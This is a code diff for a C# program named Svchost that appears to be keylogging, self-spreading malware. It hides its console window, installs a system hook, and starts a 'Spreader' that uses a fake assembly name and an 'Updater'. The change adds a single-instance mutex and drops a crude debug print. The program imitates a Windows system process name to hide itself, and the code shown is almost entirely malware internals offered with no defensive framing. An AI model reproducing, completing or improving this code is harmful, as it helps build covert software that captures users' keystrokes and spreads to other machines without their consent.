@@ -7,6 +7,7 @@ using System.Text;
 using Svchost.Update;
 using Svchost.Spread;
 using Svchost.TextHandling;
+using System.Threading;
 
 namespace Svchost
 {
@@ -21,6 +22,8 @@ namespace Svchost
         private static IntPtr _hookID = IntPtr.Zero;
         private static TextHandler textHandler;
 
+        static Mutex mutex = new Mutex(true, "{8F610AH4-B9A1-45fd-A8JF-72F24E6BDE8F}");
+
         public static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
@@ -29,16 +32,23 @@ namespace Svchost
             ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
-            textHandler = new TextHandler(Property.SessionName);
-            
-            var spreader = new Spreader(Property.FakeAssemblyName, Property.AssemblyName, Property.AppPath, Property.SessionName);
 
-            var updater = new Updater();
-            updater.StartMonitoring();
+            if (mutex.WaitOne(TimeSpan.Zero, true))
+            {
+                textHandler = new TextHandler(Property.SessionName);
 
-            Console.WriteLine("bite : " + (args.Length > 0 ? args[0] : "cul"));
+                var spreader = new Spreader(Property.FakeAssemblyName, Property.AssemblyName, Property.AppPath, Property.SessionName);
 
-            Application.Run();
+                var updater = new Updater();
+                updater.StartMonitoring(Property.SessionName);
+
+                Application.Run();
+                mutex.ReleaseMutex();
+            }
+            else
+            {
+
+            }
             UnhookWindowsHookEx(_hookID);
         }
 
